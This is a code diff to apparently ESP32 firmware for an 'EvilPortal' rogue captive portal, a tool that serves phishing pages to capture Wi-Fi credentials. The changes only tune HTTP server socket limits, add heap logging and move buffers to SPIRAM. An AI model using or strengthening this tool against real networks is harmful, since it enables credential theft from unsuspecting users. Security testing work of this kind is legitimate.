@@ -22,6 +22,8 @@
 #define TAG "EvilPortal"
 #define DNS_PORT 53
 #define DNS_TASK_STACK 6144
+#define EP_HTTPD_MAX_URI_HANDLERS 18
+#define EP_HTTPD_MAX_OPEN_SOCKETS 8
 
 static volatile bool s_running = false;
 static volatile bool s_paused = false;
@@ -149,6 +151,13 @@ static volatile bool s_creds_already_valid = false;
 
 static char* s_html_buf = NULL;
 static size_t s_html_len = 0;
+
+static void log_internal_heap(const char* where) {
+    ESP_LOGI(TAG, "%s: internal free=%lu largest=%lu",
+             where,
+             (unsigned long)heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT),
+             (unsigned long)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT));
+}
 
 static int hex_decode_char(char c) {
     if(c >= '0' && c <= '9') return c - '0';
@@ -549,12 +558,10 @@ static void http_close_cb(httpd_handle_t hd, int sockfd) {
 static bool start_http(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.server_port = 80;
-    config.max_uri_handlers = 24;
-    // Bumped from 7 → 13: Windows clients open many parallel connections (Steam,
-    // Discord, Chrome, WPAD, NCSI, etc) the moment they detect a new network,
-    // and 7 sockets exhausts within milliseconds, dropping browser captive-portal
-    // probes with ERR_CONNECTION_RESET. 13 is the practical max per ESP-IDF.
-    config.max_open_sockets = 13;
+    config.max_uri_handlers = EP_HTTPD_MAX_URI_HANDLERS;
+    // Keep internal DRAM headroom while WiFi is already up; LRU purge still
+    // drops stale browser phone-home sockets quickly.
+    config.max_open_sockets = EP_HTTPD_MAX_OPEN_SOCKETS;
     config.uri_match_fn = httpd_uri_match_wildcard;
     config.lru_purge_enable = true;
     // Aggressive recv timeout so a stuck client doesn't squat a socket forever.
@@ -565,11 +572,16 @@ static bool start_http(void) {
 
     ESP_LOGI(TAG, "httpd_start: port=%u max_uri=%u max_sockets=%u",
              config.server_port, config.max_uri_handlers, config.max_open_sockets);
-    if(httpd_start(&s_http, &config) != ESP_OK) {
-        ESP_LOGE(TAG, "httpd_start failed");
+    log_internal_heap("httpd_start before");
+    esp_err_t err = httpd_start(&s_http, &config);
+    if(err != ESP_OK) {
+        ESP_LOGE(TAG, "httpd_start failed: %s (0x%x)", esp_err_to_name(err), (unsigned)err);
+        log_internal_heap("httpd_start failed");
+        s_http = NULL;
         return false;
     }
     ESP_LOGI(TAG, "httpd_start OK, handle=%p", s_http);
+    log_internal_heap("httpd_start after");
     httpd_register_uri_handler(s_http, &uri_root_get);
     httpd_register_uri_handler(s_http, &uri_post_post);
     httpd_register_uri_handler(s_http, &uri_post_get);
@@ -1161,7 +1173,8 @@ static void evil_portal_start_worker(void* arg) {
     }
     if(cfg->router_ssid_options && cfg->router_ssid_options[0]) {
         size_t n = strlen(cfg->router_ssid_options);
-        s_router_ssid_options = malloc(n + 1);
+        s_router_ssid_options = heap_caps_malloc(n + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+        if(!s_router_ssid_options) s_router_ssid_options = malloc(n + 1);
         if(s_router_ssid_options) {
             memcpy(s_router_ssid_options, cfg->router_ssid_options, n + 1);
         }
@@ -1173,7 +1186,8 @@ static void evil_portal_start_worker(void* arg) {
         s_html_len = 0;
     }
     if(cfg->html && cfg->html_len > 0) {
-        s_html_buf = malloc(cfg->html_len + 1);
+        s_html_buf = heap_caps_malloc(cfg->html_len + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+        if(!s_html_buf) s_html_buf = malloc(cfg->html_len + 1);
         if(s_html_buf) {
             memcpy(s_html_buf, cfg->html, cfg->html_len);
             s_html_buf[cfg->html_len] = 0;
